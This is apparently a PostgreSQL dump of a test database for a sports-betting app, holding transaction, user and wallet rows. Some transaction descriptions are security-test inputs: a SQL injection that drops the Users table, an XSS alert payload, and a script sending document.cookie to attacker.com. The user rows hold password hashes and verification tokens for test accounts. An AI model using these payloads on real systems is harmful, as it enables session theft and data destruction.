bf0ebfda-f2cb-4bf6-9868-3f0ac129be57	2a414a5c-f857-44fd-ae76-e3260c9382be	Deposit	\N	'; DROP TABLE Users; --	Completed	2025-11-14 16:26:51.748006-06	2025-11-14 16:26:51.748006-06	100.00	USD	200.01	USD	100.01	USD
3b061eaa-5a56-4807-b15e-9d452df44f86	2a414a5c-f857-44fd-ae76-e3260c9382be	Deposit	\N	Very large deposit	Completed	2025-11-14 16:27:05.326518-06	2025-11-14 16:27:05.326518-06	999999999.99	USD	1000000200.00	USD	200.01	USD
25a6de21-5bdd-41aa-bb7c-71b9ce51a61b	2a414a5c-f857-44fd-ae76-e3260c9382be	Deposit	\N	High precision decimal	Completed	2025-11-14 16:27:05.729169-06	2025-11-14 16:27:05.729169-06	123.46	USD	1000000323.46	USD	1000000200.00	USD
1f153301-dd6c-4923-b379-6056c4a7eff8	2a414a5c-f857-44fd-ae76-e3260c9382be	Deposit	\N	<img src=x onerror=alert(document.domain)>	Completed	2025-11-14 16:43:11.680199-06	2025-11-14 16:43:11.680199-06	1.00	USD	1000000324.46	USD	1000000323.46	USD
ddefea71-31a5-4ead-bf17-fc939a1b1090	2a414a5c-f857-44fd-ae76-e3260c9382be	Deposit	\N	<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>	Completed	2025-11-14 16:43:11.923329-06	2025-11-14 16:43:11.923329-06	0.50	USD	1000000324.96	USD	1000000324.46	USD
50f45e2f-871d-4990-a835-81679f7f9329	2a414a5c-f857-44fd-ae76-e3260c9382be	BetPayout	57be29ea-2a8a-4854-980c-54820bdcf8a9	Bet won: BET202511142216198602	Completed	2025-11-14 17:01:01.366488-06	2025-11-14 17:01:01.366488-06	105.00	USD	1000000429.96	USD	1000000324.96	USD
eeb383c0-394c-4d06-b64c-590dad1828d2	2a414a5c-f857-44fd-ae76-e3260c9382be	BetPayout	a66182ac-f9ef-4a73-97a7-9b87c962ceed	Bet won: BET202511142148114437	Completed	2025-11-14 17:01:01.463775-06	2025-11-14 17:01:01.463775-06	210.00	USD	1000000639.96	USD	1000000429.96	USD
26028bbf-dafb-4ef4-8408-08167a1e616f	2a414a5c-f857-44fd-ae76-e3260c9382be	BetPlaced	d65ecb01-b85f-47ed-811d-18df1d8dc2a8	Bet placed: BET202511142308028897	Completed	2025-11-14 17:08:02.320537-06	2025-11-14 17:08:02.320537-06	100.00	USD	1000000539.96	USD	1000000639.96	USD
e5ae73a1-fcef-4400-896f-1d873cf74c57	2a414a5c-f857-44fd-ae76-e3260c9382be	BetPayout	d65ecb01-b85f-47ed-811d-18df1d8dc2a8	Bet won: BET202511142308028897	Completed	2025-11-14 17:09:12.362783-06	2025-11-14 17:09:12.362783-06	712.25	USD	1000001252.21	USD	1000000539.96	USD
96790ebb-201c-4752-8069-56ae3d5464a6	2a414a5c-f857-44fd-ae76-e3260c9382be	BetPlaced	40547320-7419-4307-bfe6-926a4afb172b	Bet placed: BET202511142310516376	Completed	2025-11-14 17:10:51.094662-06	2025-11-14 17:10:51.094662-06	50.00	USD	1000001202.21	USD	1000001252.21	USD
631549d8-685d-407c-a8e7-b2811dfbe1db	2a414a5c-f857-44fd-ae76-e3260c9382be	Withdrawal	\N	Concurrent withdrawal 1	Completed	2025-11-14 17:12:36.368974-06	2025-11-14 17:12:36.368974-06	100.00	USD	1000001102.21	USD	1000001202.21	USD
007c119b-b1f1-4186-8fdf-8283d109be2d	2a414a5c-f857-44fd-ae76-e3260c9382be	Withdrawal	\N	Concurrent withdrawal 4	Completed	2025-11-14 17:12:36.372333-06	2025-11-14 17:12:36.372333-06	100.00	USD	1000001002.21	USD	1000001102.21	USD
11193898-b438-42b6-9128-4f4c33f32002	2a414a5c-f857-44fd-ae76-e3260c9382be	Withdrawal	\N	Concurrent withdrawal 2	Completed	2025-11-14 17:12:36.372332-06	2025-11-14 17:12:36.372332-06	100.00	USD	1000001002.21	USD	1000001102.21	USD
55f88a07-b668-4ab8-967c-d2142d4bcbc4	2a414a5c-f857-44fd-ae76-e3260c9382be	Withdrawal	\N	Concurrent withdrawal 3	Completed	2025-11-14 17:12:36.372844-06	2025-11-14 17:12:36.372844-06	100.00	USD	1000001002.21	USD	1000001102.21	USD
8ce393b1-9a61-4256-81c6-9995d947d9e7	2a414a5c-f857-44fd-ae76-e3260c9382be	Withdrawal	\N	Concurrent withdrawal 5	Completed	2025-11-14 17:12:36.373547-06	2025-11-14 17:12:36.373547-06	100.00	USD	1000000902.21	USD	1000001002.21	USD
d17aea07-1a8a-4153-a363-0ba523f4a564	2a414a5c-f857-44fd-ae76-e3260c9382be	Withdrawal	\N	Concurrent withdrawal test 2 #5	Completed	2025-11-14 17:22:53.063478-06	2025-11-14 17:22:53.063478-06	100.00	USD	1000000802.21	USD	1000000902.21	USD
eea336b4-b62c-4785-859e-d55cf17775c5	2a414a5c-f857-44fd-ae76-e3260c9382be	Withdrawal	\N	Concurrent withdrawal test 2 #1	Completed	2025-11-14 17:22:53.063475-06	2025-11-14 17:22:53.063475-06	100.00	USD	1000000802.21	USD	1000000902.21	USD
bb9879c1-d5ce-4c95-900e-d0939b7edd1b	2a414a5c-f857-44fd-ae76-e3260c9382be	Withdrawal	\N	Concurrent withdrawal test 2 #3	Completed	2025-11-14 17:22:53.063476-06	2025-11-14 17:22:53.063476-06	100.00	USD	1000000802.21	USD	1000000902.21	USD
49d7a92d-4e5b-466a-bf4c-2cbe6ff13ac9	2a414a5c-f857-44fd-ae76-e3260c9382be	Withdrawal	\N	Concurrent withdrawal test 2 #4	Completed	2025-11-14 17:22:53.06348-06	2025-11-14 17:22:53.06348-06	100.00	USD	1000000802.21	USD	1000000902.21	USD
4550733c-c85c-4bb8-b8c2-70f97604900e	2a414a5c-f857-44fd-ae76-e3260c9382be	Withdrawal	\N	Concurrent withdrawal test 2 #2	Completed	2025-11-14 17:22:53.063474-06	2025-11-14 17:22:53.063474-06	100.00	USD	1000000802.21	USD	1000000902.21	USD
1b88f92f-7b3a-4c26-b412-8f3c20e4c650	2a414a5c-f857-44fd-ae76-e3260c9382be	Withdrawal	\N	Test concurrent withdrawal #5	Completed	2025-11-14 17:34:17.401435-06	2025-11-14 17:34:17.401435-06	100.00	USD	1000000702.21	USD	1000000802.21	USD
9d504e65-be91-4f22-b372-14a7748ee8a6	2a414a5c-f857-44fd-ae76-e3260c9382be	Withdrawal	\N	Test concurrent withdrawal #1	Completed	2025-11-14 17:34:17.515871-06	2025-11-14 17:34:17.515871-06	100.00	USD	1000000602.21	USD	1000000702.21	USD
cba351ca-e53f-45bc-b6eb-32601c7a2e7e	2a414a5c-f857-44fd-ae76-e3260c9382be	Withdrawal	\N	Test concurrent withdrawal #3	Completed	2025-11-14 17:34:17.621841-06	2025-11-14 17:34:17.621841-06	100.00	USD	1000000502.21	USD	1000000602.21	USD
599364f6-c374-498d-a5b2-692ade45a5dd	1ef7db4b-d2b3-49ee-a985-ef4034978689	BetPlaced	4dc3e93e-b116-4033-93f1-7ed91cd405ef	Bet placed: BET202511150421568163	Completed	2025-11-14 22:21:56.319808-06	2025-11-14 22:21:56.319808-06	38.45	USD	961.55	USD	1000.00	USD
41943eba-a109-4299-a16b-17a35b1d80b3	1ef7db4b-d2b3-49ee-a985-ef4034978689	BetPlaced	19ab099d-ec3a-47d9-9168-7e2f9ffa4031	Bet placed: BET202511150421563603	Completed	2025-11-14 22:21:56.388425-06	2025-11-14 22:21:56.388425-06	68.83	USD	892.72	USD	961.55	USD
8272d4e4-43f9-4da0-b47e-87819db161d4	1ef7db4b-d2b3-49ee-a985-ef4034978689	BetPlaced	ef624305-8e39-4800-a013-bb3fb51d7a1a	Bet placed: BET202511150421565210	Completed	2025-11-14 22:21:56.393798-06	2025-11-14 22:21:56.393798-06	88.00	USD	804.72	USD	892.72	USD
38df81bc-929b-4dd3-8c67-49b31eb975f9	1ef7db4b-d2b3-49ee-a985-ef4034978689	BetPlaced	c0072d32-8763-465d-b6d7-060bc85a5fb2	Bet placed: BET202511150421567445	Completed	2025-11-14 22:21:56.397189-06	2025-11-14 22:21:56.397189-06	80.41	USD	724.31	USD	804.72	USD
3b40d04b-f84a-4f70-a726-f1888126e4b5	1ef7db4b-d2b3-49ee-a985-ef4034978689	BetPlaced	235cfdb6-846c-4f4c-afab-3b960890cd0d	Bet placed: BET202511150421568537	Completed	2025-11-14 22:21:56.400892-06	2025-11-14 22:21:56.400892-06	90.71	USD	633.60	USD	724.31	USD
c7b282fc-78f5-48d4-9e0b-354bd8e2af74	e13aba69-091f-423e-a362-22d6dd26c14e	BetPlaced	366faaac-d6b1-42ae-a024-05781c406273	Bet placed: BET202511150421566906	Completed	2025-11-14 22:21:56.403971-06	2025-11-14 22:21:56.403971-06	62.96	USD	937.04	USD	1000.00	USD
8dd47a00-fc68-444e-a0ad-24ddade7a94a	e13aba69-091f-423e-a362-22d6dd26c14e	BetPlaced	b0c209de-d875-4eca-97dd-d42007953b04	Bet placed: BET202511150421563303	Completed	2025-11-14 22:21:56.407157-06	2025-11-14 22:21:56.407157-06	52.59	USD	884.45	USD	937.04	USD
6d629581-85c2-4717-83f6-399cf4ca746f	e13aba69-091f-423e-a362-22d6dd26c14e	BetPlaced	08e8e76b-d5d8-4c80-bb23-b7ece33292dd	Bet placed: BET202511150421565428	Completed	2025-11-14 22:21:56.411004-06	2025-11-14 22:21:56.411004-06	32.71	USD	851.74	USD	884.45	USD
22092743-100a-4ba3-a263-da07d3a7a76f	e13aba69-091f-423e-a362-22d6dd26c14e	BetPlaced	14d12b67-c8e4-40b8-abb6-611ee015e1a4	Bet placed: BET202511150421565194	Completed	2025-11-14 22:21:56.414709-06	2025-11-14 22:21:56.414709-06	71.68	USD	780.06	USD	851.74	USD
0cc80ec8-4d23-45bf-9960-aaa4dfcb7939	e13aba69-091f-423e-a362-22d6dd26c14e	BetPlaced	00365444-2801-4692-8f00-f9bbee10b2df	Bet placed: BET202511150421564201	Completed	2025-11-14 22:21:56.417928-06	2025-11-14 22:21:56.417928-06	20.13	USD	759.93	USD	780.06	USD
3fcc5161-2ffe-4b0a-9b5c-680cc40be357	1ef7db4b-d2b3-49ee-a985-ef4034978689	BetPlaced	4a2cac53-5e0e-4015-afad-5bb35d94cf36	Bet placed: BET202511150426056242	Completed	2025-11-14 22:26:05.877523-06	2025-11-14 22:26:05.877523-06	54.79	USD	578.81	USD	633.60	USD
e9ba9376-eb87-44a4-aa01-d4d45f4ecf9f	1ef7db4b-d2b3-49ee-a985-ef4034978689	BetPlaced	8ae04dc4-bc7e-42ae-afbd-7320ebe4189c	Bet placed: BET202511150426056012	Completed	2025-11-14 22:26:05.88319-06	2025-11-14 22:26:05.88319-06	37.34	USD	541.47	USD	578.81	USD
22b1d4ec-383d-43c3-8c6d-0afbf7cd28a5	e13aba69-091f-423e-a362-22d6dd26c14e	BetPlaced	689931c8-d466-4aae-924d-57c49407e37d	Bet placed: BET202511150426053905	Completed	2025-11-14 22:26:05.987905-06	2025-11-14 22:26:05.987905-06	18.43	USD	741.50	USD	759.93	USD
e70bf708-922d-49f8-ae7e-21cc7a87be58	e13aba69-091f-423e-a362-22d6dd26c14e	BetPlaced	b4af0b77-3694-4e5b-9563-03f85adeada8	Bet placed: BET202511150426053830	Completed	2025-11-14 22:26:05.992025-06	2025-11-14 22:26:05.992025-06	47.81	USD	693.69	USD	741.50	USD
195d6bda-17bc-45ab-9adc-c0f34367ed24	91966209-ca29-439d-bea5-ea8b3a0dc2b0	BetPlaced	6e80a592-5cf8-47ae-bc82-678285521eac	Bet placed: BET202511150430526989	Completed	2025-11-14 22:30:52.561836-06	2025-11-14 22:30:52.561836-06	70.55	GBP	929.45	GBP	1000.00	GBP
253ce781-a961-491f-89b9-75c0f23a610d	91966209-ca29-439d-bea5-ea8b3a0dc2b0	BetPlaced	09a2ab08-6fc0-4861-a3cc-7df113fe0c24	Bet placed: BET202511150430522445	Completed	2025-11-14 22:30:52.565838-06	2025-11-14 22:30:52.565838-06	45.91	GBP	883.54	GBP	929.45	GBP
ba2b27d5-fb1a-4c6c-ba71-3641c717ae63	b2503a1c-4e2c-4fdd-832e-fe27ce7627fa	BetPlaced	c8cb7946-07cb-4818-a1d2-3cd609682900	Bet placed: BET202511150430528277	Completed	2025-11-14 22:30:52.774153-06	2025-11-14 22:30:52.774153-06	33.98	EUR	966.02	EUR	1000.00	EUR
685dcb0b-2952-472d-ba17-9c1693b4662e	838d44ed-4447-480a-91c6-5011bb11369f	BetPlaced	0072e65b-8110-4988-af24-901a25e84380	Bet placed: BET202511150430529317	Completed	2025-11-14 22:30:52.995585-06	2025-11-14 22:30:52.995585-06	33.68	STR	966.32	STR	1000.00	STR
15c1f50e-9201-4810-80fd-41d4b7971b6e	d1a9d8b1-5121-4415-b1ab-a79c02995c3e	BetPlaced	4cafb04b-5c80-4c6d-9510-3972e327de6d	Bet placed: BET202511150430534170	Completed	2025-11-14 22:30:53.214262-06	2025-11-14 22:30:53.214262-06	54.34	STR	945.66	STR	1000.00	STR
eed1afff-34cd-47c7-a664-37259ceb4e7c	d029350a-0055-40fd-961b-07c65072613a	BetPlaced	6b82aaaa-b584-4b22-af42-f7d95d9e6cc1	Bet placed: BET202511150430537648	Completed	2025-11-14 22:30:53.435457-06	2025-11-14 22:30:53.435457-06	55.82	USD	944.18	USD	1000.00	USD
d9b94a12-a99e-47bf-b77d-9d3ceb399205	647ff2c3-4dd7-4778-b390-bd6c0f32dff0	BetPlaced	1e7ba305-8280-4e5f-897d-e334cbb7a1fa	Bet placed: BET202511150433309326	Completed	2025-11-14 22:33:30.831919-06	2025-11-14 22:33:30.831919-06	83.99	USD	916.01	USD	1000.00	USD
ce6761e9-93b5-44a7-9c49-155d65232a92	e6535c73-b40c-462d-8faa-aab8cf8e6f01	BetPlaced	116af921-0c7b-467b-b685-38a1c9ea7b4e	Bet placed: BET202511150433309010	Completed	2025-11-14 22:33:30.973414-06	2025-11-14 22:33:30.973414-06	60.61	USD	939.39	USD	1000.00	USD
f62e2c84-530a-4787-8d97-b55c9b4c5a62	7e58c576-a98a-4973-8835-1b542aad3459	BetPlaced	20826f4f-883c-4d30-b351-fd4d94b23f25	Bet placed: BET202511150433319561	Completed	2025-11-14 22:33:31.113719-06	2025-11-14 22:33:31.113719-06	86.42	USD	913.58	USD	1000.00	USD
8ef1ceea-ff7e-4510-a916-3f25ea712ba1	4a4c880b-41ed-4713-965f-de25d4d341cd	BetPlaced	068e8f92-7958-4f82-a955-ac773c965cf3	Bet placed: BET202511150433319405	Completed	2025-11-14 22:33:31.253906-06	2025-11-14 22:33:31.253906-06	89.16	GBP	910.84	GBP	1000.00	GBP
406775bb-6e1f-41f8-a47a-c0649ef08b7a	29e88d16-814c-4d63-ad9a-01dc4240710e	BetPlaced	53020a2f-c679-4e06-8759-ddba7f475798	Bet placed: BET202511150434159863	Completed	2025-11-14 22:34:15.330837-06	2025-11-14 22:34:15.330837-06	87.13	USD	912.87	USD	1000.00	USD
ae1d6e45-c07b-463b-8bba-e044ca1756af	773b8d10-e105-47c6-ab53-9a3b26759637	BetPlaced	1f8e530d-db4c-4c66-8868-8f7a43398b54	Bet placed: BET202511150434206596	Completed	2025-11-14 22:34:20.49186-06	2025-11-14 22:34:20.49186-06	55.37	JPY	944.63	JPY	1000.00	JPY
b176a473-bd62-4416-9606-ed2e9c62d033	8c09f1af-1515-4495-837c-6674da6d2be3	BetPlaced	dbe085fc-9c06-496c-8a52-7f506b72d98b	Bet placed: BET202511150434252249	Completed	2025-11-14 22:34:25.664409-06	2025-11-14 22:34:25.664409-06	42.76	USD	957.24	USD	1000.00	USD
05d1887a-d145-4eff-85c7-60dcc3233b14	093f6af7-5a7a-4c41-a4fd-4323ee0c501f	BetPlaced	d2817a4c-e976-47ab-8842-fbe41afae344	Bet placed: BET202511150434304503	Completed	2025-11-14 22:34:30.844929-06	2025-11-14 22:34:30.844929-06	45.14	USD	954.86	USD	1000.00	USD
ddb92edc-f6c3-48ad-ba46-3812dc3422eb	ce40595a-26f8-4659-a937-82dee702c2a8	BetPlaced	2b519d55-f3ec-4155-bf68-1628295a2c4e	Bet placed: BET202511150434368021	Completed	2025-11-14 22:34:36.010394-06	2025-11-14 22:34:36.010394-06	45.78	USD	954.22	USD	1000.00	USD
f2ca977a-ea5f-48fe-87b3-b35157ca0b13	afab4f82-de2b-40c7-8000-0410e828e2b9	BetPlaced	90939f65-9adf-4f94-998d-4c88fb2a9d7b	Bet placed: BET202511150435413692	Completed	2025-11-14 22:35:41.174085-06	2025-11-14 22:35:41.174085-06	62.52	USD	937.48	USD	1000.00	USD
f01f47dd-81fb-45c5-b1a9-3b1b99d06c27	bafd125b-cb44-47f1-9a25-93b69e7483ef	BetPlaced	809bb874-f60a-4ca9-98c7-a56dfbb633e9	Bet placed: BET202511150435463228	Completed	2025-11-14 22:35:46.33688-06	2025-11-14 22:35:46.33688-06	78.16	NOK	921.84	NOK	1000.00	NOK
ea0d7d69-dfa0-4848-bb60-f5ff8c3d2356	c47e3e35-7877-4802-8a02-02843973a1d4	BetPlaced	ba1276c5-28e7-40a6-8f1c-26e13edb59b9	Bet placed: BET202511150435515731	Completed	2025-11-14 22:35:51.510301-06	2025-11-14 22:35:51.510301-06	49.32	CAD	950.68	CAD	1000.00	CAD
21fa8d65-f69c-41cb-8975-0a232e18e3c8	b70d5a3c-c776-4795-9caf-f83e60b822a4	BetPlaced	fcd166ea-255e-4ea6-bb41-95a00ef314a8	Bet placed: BET202511150435564410	Completed	2025-11-14 22:35:56.670525-06	2025-11-14 22:35:56.670525-06	11.96	JPY	988.04	JPY	1000.00	JPY
af75580c-8b49-4c31-90ad-bf20b3c1f185	6d9f9662-688c-487c-8301-95625d842b7e	BetPlaced	4244edc5-6713-4754-9832-2ac011011754	Bet placed: BET202511150436019682	Completed	2025-11-14 22:36:01.834048-06	2025-11-14 22:36:01.834048-06	64.20	AUD	935.80	AUD	1000.00	AUD
9e9d96dc-1529-479c-ba40-0c16493e46df	9d7aad08-481e-4dfb-aaaa-3bec95827c10	BetPlaced	94ecf60c-9447-49b6-99f5-ff6dac24af74	Bet placed: BET202511150437069722	Completed	2025-11-14 22:37:06.992927-06	2025-11-14 22:37:06.992928-06	43.94	CHF	956.06	CHF	1000.00	CHF
b6a38dbe-c643-45bb-8596-01e51f19585f	db4ef871-1da4-4506-be39-f5d22ba1b4f6	BetPlaced	cc3a0982-69e4-487f-bf1a-8ae290052071	Bet placed: BET202511150437123361	Completed	2025-11-14 22:37:12.147924-06	2025-11-14 22:37:12.147924-06	53.17	NZD	946.83	NZD	1000.00	NZD
050eb9aa-81d0-40a6-82a7-e86a2c388d27	d079c970-6efb-4cf8-a8e1-baef89819fcc	BetPlaced	5c9771dc-3940-4240-99c2-6fe3cfe8f6ae	Bet placed: BET202511150437177583	Completed	2025-11-14 22:37:17.311095-06	2025-11-14 22:37:17.311095-06	52.43	SEK	947.57	SEK	1000.00	SEK
\.


--
-- Data for Name: Users; Type: TABLE DATA; Schema: public; Owner: calebwilliams
--

COPY public."Users" ("Id", "Username", "Email", "PasswordHash", "Currency", "CreatedAt", "LastLoginAt", "Status", "EmailVerificationToken", "EmailVerificationTokenExpires", "EmailVerified", "PasswordResetToken", "PasswordResetTokenExpires", "Role") FROM stdin;
2a414a5c-f857-44fd-ae76-e3260c9382be	demo_user	demo@sportsbetting.com	hashed_password_123	USD	2025-11-14 15:48:11.909487-06	\N	Active	\N	\N	f	\N	\N	0
7e58c576-a98a-4973-8835-1b542aad3459	charlie	charlie@example.com	$2a$11$zJ6H4jpT9Uq8hweDBiFO0OyVS9XOPDfBrmpaxZTYZdUAHRYSmADiK	USD	2025-11-14 20:40:10.653939-06	2025-11-14 22:33:31.095565-06	Active	\N	\N	f	\N	\N	0
c47e3e35-7877-4802-8a02-02843973a1d4	user4	user4@example.com	$2a$11$zJ6H4jpT9Uq8hweDBiFO0OyVS9XOPDfBrmpaxZTYZdUAHRYSmADiK	CAD	2025-11-14 20:52:14.522492-06	2025-11-14 22:35:51.493673-06	Active	Db8bTmGt2zo28spJO7hbAT1DO0CbTytDkm5mifu/whA=	2025-11-15 20:52:14.522599-06	f	\N	\N	0
b70d5a3c-c776-4795-9caf-f83e60b822a4	user5	user5@example.com	$2a$11$zJ6H4jpT9Uq8hweDBiFO0OyVS9XOPDfBrmpaxZTYZdUAHRYSmADiK	JPY	2025-11-14 20:53:34.553174-06	2025-11-14 22:35:56.65239-06	Active	Le/ImOMyjputZaHCMViKj/AAPaTm3ntJVTMvkdH7YGU=	2025-11-15 20:53:34.553176-06	f	\N	\N	0
4a4c880b-41ed-4713-965f-de25d4d341cd	diana	diana@example.com	$2a$11$zJ6H4jpT9Uq8hweDBiFO0OyVS9XOPDfBrmpaxZTYZdUAHRYSmADiK	GBP	2025-11-14 20:40:10.654386-06	2025-11-14 22:33:31.2372-06	Active	\N	\N	f	\N	\N	0
29e88d16-814c-4d63-ad9a-01dc4240710e	frank	frank@example.com	$2a$11$zJ6H4jpT9Uq8hweDBiFO0OyVS9XOPDfBrmpaxZTYZdUAHRYSmADiK	USD	2025-11-14 20:40:10.654539-06	2025-11-14 22:34:15.313092-06	Active	\N	\N	f	\N	\N	0
1ef7db4b-d2b3-49ee-a985-ef4034978689	alice	alice@example.com	$2a$11$zJ6H4jpT9Uq8hweDBiFO0OyVS9XOPDfBrmpaxZTYZdUAHRYSmADiK	USD	2025-11-14 20:27:57.720209-06	2025-11-14 22:58:34.853488-06	Active	\N	\N	f	\N	\N	0
c2348e10-104f-41f8-8b95-f1a9ab066f6e	bob	bob@example.com	$2a$11$Akf.49habMKrWTvziXIApOOV6jrmAsbQVfVoKYFOvF3zFfCid.NUi	EUR	2025-11-14 20:28:11.272521-06	2025-11-14 22:12:30.861729-06	Active	\N	\N	f	\N	\N	1
773b8d10-e105-47c6-ab53-9a3b26759637	grace	grace@example.com	$2a$11$zJ6H4jpT9Uq8hweDBiFO0OyVS9XOPDfBrmpaxZTYZdUAHRYSmADiK	JPY	2025-11-14 20:40:10.653939-06	2025-11-14 22:34:20.475218-06	Active	\N	\N	f	\N	\N	0
8c09f1af-1515-4495-837c-6674da6d2be3	iris	iris@example.com	$2a$11$zJ6H4jpT9Uq8hweDBiFO0OyVS9XOPDfBrmpaxZTYZdUAHRYSmADiK	USD	2025-11-14 20:47:36.512536-06	2025-11-14 22:34:25.646459-06	Active	vcjz4iNpXPRuu/7yJ2eHBAlexK75zqwLd6UGgzh/H0c=	2025-11-15 20:47:36.512635-06	f	\N	\N	0
6d9f9662-688c-487c-8301-95625d842b7e	user6	user6@example.com	$2a$11$zJ6H4jpT9Uq8hweDBiFO0OyVS9XOPDfBrmpaxZTYZdUAHRYSmADiK	AUD	2025-11-14 20:53:34.553308-06	2025-11-14 22:36:01.817513-06	Active	X0/7qwm3o/gJNecc5Us9EiwzGwJqLwppzwuUeMpsfIo=	2025-11-15 20:53:34.55331-06	f	\N	\N	0
e13aba69-091f-423e-a362-22d6dd26c14e	admin	admin@example.com	$2a$11$S.mYVqSAME7i6GjRxBsn3.EOL.t6KCdPJwt72OfybHZVrH1WzG2Jy	USD	2025-11-14 21:46:15.225455-06	2025-11-14 22:58:35.080168-06	Active	HJL9FR0z6ZbTmF4oqrLd9G+E7TBBXSayS/jInzaQEQk=	2025-11-15 21:46:15.225566-06	f	\N	\N	2
093f6af7-5a7a-4c41-a4fd-4323ee0c501f	testadmin1763179113	testadmin1763179113@example.com	$2a$11$zJ6H4jpT9Uq8hweDBiFO0OyVS9XOPDfBrmpaxZTYZdUAHRYSmADiK	USD	2025-11-14 21:58:33.990022-06	2025-11-14 22:34:30.830889-06	Active	XT+gyyxcgcH2actVJNOobIJrFZthcBdM8jN3yWRP4E8=	2025-11-15 21:58:33.990026-06	f	\N	\N	2
ce40595a-26f8-4659-a937-82dee702c2a8	testuser	test@example.com	$2a$11$zJ6H4jpT9Uq8hweDBiFO0OyVS9XOPDfBrmpaxZTYZdUAHRYSmADiK	USD	2025-11-14 19:50:06.002826-06	2025-11-14 22:34:35.99325-06	Active	\N	\N	f	\N	\N	0
afab4f82-de2b-40c7-8000-0410e828e2b9	user1	user1@example.com	$2a$11$zJ6H4jpT9Uq8hweDBiFO0OyVS9XOPDfBrmpaxZTYZdUAHRYSmADiK	USD	2025-11-14 20:52:14.522495-06	2025-11-14 22:35:41.156152-06	Active	9behK63pxcACwaxeLl6q471INWdu9OikE7x88Q5pv5A=	2025-11-15 20:52:14.522601-06	f	\N	\N	0
9d7aad08-481e-4dfb-aaaa-3bec95827c10	user7	user7@example.com	$2a$11$zJ6H4jpT9Uq8hweDBiFO0OyVS9XOPDfBrmpaxZTYZdUAHRYSmADiK	CHF	2025-11-14 20:53:34.553868-06	2025-11-14 22:37:06.973348-06	Active	Z9HjHhxWyFbGPQx0BYGJU0ZOoJE6JyNm1gP4Tw4SAjc=	2025-11-15 20:53:34.553869-06	f	\N	\N	0
db4ef871-1da4-4506-be39-f5d22ba1b4f6	user8	user8@example.com	$2a$11$zJ6H4jpT9Uq8hweDBiFO0OyVS9XOPDfBrmpaxZTYZdUAHRYSmADiK	NZD	2025-11-14 20:53:34.552351-06	2025-11-14 22:37:12.130386-06	Active	1wcMY9r0BzBbUVWYk4yEIayZFidYRgdj3+NMXNaELdc=	2025-11-15 20:53:34.552356-06	f	\N	\N	0
d079c970-6efb-4cf8-a8e1-baef89819fcc	user9	user9@example.com	$2a$11$zJ6H4jpT9Uq8hweDBiFO0OyVS9XOPDfBrmpaxZTYZdUAHRYSmADiK	SEK	2025-11-14 20:54:39.675623-06	2025-11-14 22:37:17.293879-06	Active	3xh1VbrUpRVWqjmiRZoaq2RQfGgHva+ZgUL233GwcKM=	2025-11-15 20:54:39.675627-06	f	\N	\N	0
91966209-ca29-439d-bea5-ea8b3a0dc2b0	user3	user3@example.com	$2a$11$zJ6H4jpT9Uq8hweDBiFO0OyVS9XOPDfBrmpaxZTYZdUAHRYSmADiK	GBP	2025-11-14 20:52:14.52249-06	2025-11-14 22:30:52.556495-06	Active	ciseq5OamaM7u7aLlcPVnmDjczuimd5IAS6NXK5eYwA=	2025-11-15 20:52:14.522593-06	f	\N	\N	0
b2503a1c-4e2c-4fdd-832e-fe27ce7627fa	bob1763178407	bob1763178407@example.com	$2a$11$zJ6H4jpT9Uq8hweDBiFO0OyVS9XOPDfBrmpaxZTYZdUAHRYSmADiK	EUR	2025-11-14 21:46:47.90869-06	2025-11-14 22:30:52.769818-06	Active	lkeTKml3UK9qlqT0/wPbibH+qKGpzEyazlLERzh0DKg=	2025-11-15 21:46:47.908694-06	f	\N	\N	0
838d44ed-4447-480a-91c6-5011bb11369f	string2	user2@example.com	$2a$11$zJ6H4jpT9Uq8hweDBiFO0OyVS9XOPDfBrmpaxZTYZdUAHRYSmADiK	STR	2025-11-14 20:20:05.306162-06	2025-11-14 22:30:52.990958-06	Active	\N	\N	f	\N	\N	0
d1a9d8b1-5121-4415-b1ab-a79c02995c3e	string	user@example.com	$2a$11$zJ6H4jpT9Uq8hweDBiFO0OyVS9XOPDfBrmpaxZTYZdUAHRYSmADiK	STR	2025-11-14 20:12:01.533086-06	2025-11-14 22:30:53.209873-06	Active	\N	\N	f	\N	\N	0
d029350a-0055-40fd-961b-07c65072613a	henry	henry@example.com	$2a$11$zJ6H4jpT9Uq8hweDBiFO0OyVS9XOPDfBrmpaxZTYZdUAHRYSmADiK	USD	2025-11-14 20:45:32.836728-06	2025-11-14 22:30:53.430458-06	Active	\N	\N	t	\N	\N	0
647ff2c3-4dd7-4778-b390-bd6c0f32dff0	admin1763178407	admin1763178407@example.com	$2a$11$zJ6H4jpT9Uq8hweDBiFO0OyVS9XOPDfBrmpaxZTYZdUAHRYSmADiK	USD	2025-11-14 21:46:47.587177-06	2025-11-14 22:33:30.814532-06	Active	hhS0MQ5vtgZbK9sR1XU6AtuZ+Sc1uP14FvVylse+qpo=	2025-11-15 21:46:47.587181-06	f	\N	\N	2
e6535c73-b40c-462d-8faa-aab8cf8e6f01	alice1763178407	alice1763178407@example.com	$2a$11$zJ6H4jpT9Uq8hweDBiFO0OyVS9XOPDfBrmpaxZTYZdUAHRYSmADiK	USD	2025-11-14 21:46:47.756012-06	2025-11-14 22:33:30.956566-06	Active	ppAWUuijOtgmQ9JrfvSOFRWVj7Z8YEYz8pK1WqGCzOU=	2025-11-15 21:46:47.756015-06	f	\N	\N	0
bafd125b-cb44-47f1-9a25-93b69e7483ef	user10	user10@example.com	$2a$11$zJ6H4jpT9Uq8hweDBiFO0OyVS9XOPDfBrmpaxZTYZdUAHRYSmADiK	NOK	2025-11-14 20:54:39.675767-06	2025-11-14 22:35:46.319522-06	Active	xyTSCasrSCtXyfiTXWV+//X2OeaE21CgnfBWg7eN/E4=	2025-11-15 20:54:39.675768-06	f	\N	\N	0
\.


--
-- Data for Name: Wallets; Type: TABLE DATA; Schema: public; Owner: calebwilliams
--

COPY public."Wallets" ("Id", "UserId", "CreatedAt", "LastUpdatedAt", "Balance", "Currency", "TotalBet", "TotalBetCurrency", "TotalDeposited", "TotalDepositedCurrency", "TotalWithdrawn", "TotalWithdrawnCurrency", "TotalWon", "TotalWonCurrency") FROM stdin;
53f7b9ed-13d1-4831-81f7-2f64d972a48c	29e88d16-814c-4d63-ad9a-01dc4240710e	2025-11-14 22:26:05.749981-06	2025-11-14 22:34:15.330836-06	912.87	USD	87.13	USD	1000.00	USD	0.00	USD	0.00	USD
a731c616-30dc-43c9-9416-299e4c77e408	773b8d10-e105-47c6-ab53-9a3b26759637	2025-11-14 22:26:05.749981-06	2025-11-14 22:34:20.491859-06	944.63	JPY	55.37	JPY	1000.00	JPY	0.00	JPY	0.00	JPY
